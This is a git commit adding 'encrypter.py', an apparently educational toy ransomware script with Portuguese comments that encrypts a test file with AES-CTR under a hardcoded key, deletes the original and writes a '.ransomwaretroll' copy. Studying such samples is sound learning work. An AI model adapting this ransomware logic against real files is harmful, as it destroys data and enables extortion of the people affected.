122d75ffad5020fdaa2922bf2ae99f70287c4857
cassiano-dio <cassiano@dio.me>
2022-11-09 14:46:21 -0300

    Initial commit

---
+++ encrypter.py
@@ -0,0 +1,24 @@
+import os
+import pyaes
+
+## abrir o arquivo a ser criptografado
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+## remover o arquivo
+os.remove(file_name)
+
+## chave de criptografia
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+## salvar o arquivo criptografado
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
